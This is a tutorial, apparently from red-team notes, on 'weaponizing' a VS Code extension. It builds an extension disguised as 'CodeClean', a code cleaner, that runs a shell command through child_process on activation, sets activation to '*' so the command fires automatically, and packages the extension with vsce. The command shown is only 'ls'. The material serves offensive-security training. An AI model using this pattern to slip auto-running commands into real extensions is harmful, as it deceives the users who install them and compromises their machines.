# Weaponization Of vscode Extension

### Required tools:

[VSCode](https://code.visualstudio.com/)

[Nodejs](https://nodejs.org/en)

[“](https://www.npmjs.com/package/generator-code)[yo](https://www.npmjs.com/package/generator-code)[ generator-code” package](https://www.npmjs.com/package/generator-code)

[vsce](https://www.npmjs.com/package/vsce)

### Installing “yo generator-code package”

```bash
┌─[_]─[g37sys73m@parrot]─[~/vscode_extention]
└──_ $sudo npm install -g yo generator-code package
npm WARN deprecated are-we-there-yet@1.1.7: This package is no longer supported.
npm WARN deprecated gauge@1.2.7: This package is no longer supported.
npm WARN deprecated npmlog@2.0.4: This package is no longer supported.

added 1012 packages in 48s

147 packages are looking for funding
  run `npm fund` for details
```

### Installing vsce package: Used in packaging and publishing VSCode extension

```bash
┌─[g37sys73m@parrot]─[~/vscode_extention]
└──_ $sudo npm install vsce
npm WARN deprecated inflight@1.0.6: This module is not supported, and leaks memory. Do not use it. Check out lru-cache if you want a good and tested way to coalesce async requests by a key value, which is much more comprehensive and powerful.
npm WARN deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
npm WARN deprecated vsce@2.15.0: vsce has been renamed to @vscode/vsce. Install using @vscode/vsce instead.

added 112 packages in 7s

35 packages are looking for funding
  run `npm fund` for details
```

### Generating new extension template with “yo code” command.

```bash
┌─[g37sys73m@parrot]─[~/vscode_extention]                                                                                                                                                     
└──_ $sudo yo code                                                                                                                                                                            
                                                                                                                                                                                              
     _-----_     _──────────────────────────_                                                                                                                                                 
    |       |    │   Welcome to the Visual  │                                                                                                                                                 
    |--(o)--|    │   Studio Code Extension  │                                                                                                                                                 
   `---------_   │        generator!        │                                                                                                                                                 
    ( __U`_ )    _──────────────────────────_                                                                                                                                                 
    /___A___\   /                                                                                                                                                                             
     |  ~  |                                                                                                                                                                                  
   __'.___.'__                                                                                                                                                                                
 _   `  |_ _ Y `                                                                                                                                                                              
                                                                                                                                                                                              
? What type of extension do you want to create? New Extension (JavaScript)                                                                                                                    
? What's the name of your extension? CodeClean                                                                                                                                                
? What's the identifier of your extension? CodeClean                                                                                                                                          
? What's the description of your extension? Code Cleaner                                                                                                                                      
? Enable JavaScript type checking in 'jsconfig.json'? No                                                                                                                                      
? Initialize a git repository? No                                                                                                                                                             
? Which package manager to use? npm 

Writing in /home/g37sys73m/vscode_extention/CodeClean...
identical CodeClean/.vscode/extensions.json
identical CodeClean/.vscode/launch.json
identical CodeClean/test/extension.test.js
identical CodeClean/.vscodeignore
identical CodeClean/README.md
identical CodeClean/CHANGELOG.md
identical CodeClean/vsc-extension-quickstart.md
identical CodeClean/jsconfig.json
identical CodeClean/extension.js
identical CodeClean/package.json
identical CodeClean/.vscode-test.mjs
identical CodeClean/.eslintrc.json

No change to package.json was detected. No package manager install will be executed.

Your extension CodeClean has been created!

To start editing with Visual Studio Code, use the following commands:

     code CodeClean

Open vsc-extension-quickstart.md inside the new extension for further instructions
on how to modify, test and publish your extension.

For more information, also visit http://code.visualstudio.com and follow us @code.
```

### Understanding the extention.js

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Modifying the extention.js file with code that executes a Command

```javascript
// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');
const { exec } = require('child_process');

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */


function activate(context) {

	// This function will run once when the Extention is loaded	
	// Command to execute
	const cmd = 'ls'; // Use 'dir' for Windows

	exec(cmd, (error, stdout, stderr) => {
  		if (error) {
    		console.error(`Error executing command: ${error}`);
    		return;
  		}
  		if (stderr) {
    		console.error(`Standard error: ${stderr}`);
    		return;
  		}
  		console.log(`Standard output:\n${stdout}`);
	});

}


function deactivate() {}
// This method is called when your extension is deactivated
module.exports = {
	activate,
	deactivate
}
```

### Triggering automatic activation of the extension.

Set activationEvents property with wild card “\*”.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Compiling new extension package using “vsce” command.

{% code overflow="wrap" %}
```bash
┌─[✗]─[g37sys73m@parrot]─[~/vscode_extention/CodeClean]
└──╼ $sudo vsce package
 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Do you want to continue? [y/N] y
 WARNING  Using '*' activation is usually a bad idea as it impacts performance.
More info: https://code.visualstudio.com/api/references/activation-events#Start-up
Do you want to continue? [y/N] y
 WARNING  LICENSE.md, LICENSE.txt or LICENSE not found
Do you want to continue? [y/N] y
This extension consists of 1964 files, out of which 1155 are JavaScript files. For performance reasons, you should bundle your extension: https://aka.ms/vscode-bundle-extension . You should also exclude unnecessary files by adding them to your .vscodeignore: https://aka.ms/vscode-vscodeignore
 DONE  Packaged: /home/g37sys73m/vscode_extention/CodeClean/CodeClean-0.0.1.vsix (1964 files, 2.72MB
```
{% endcode %}

### Executing

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

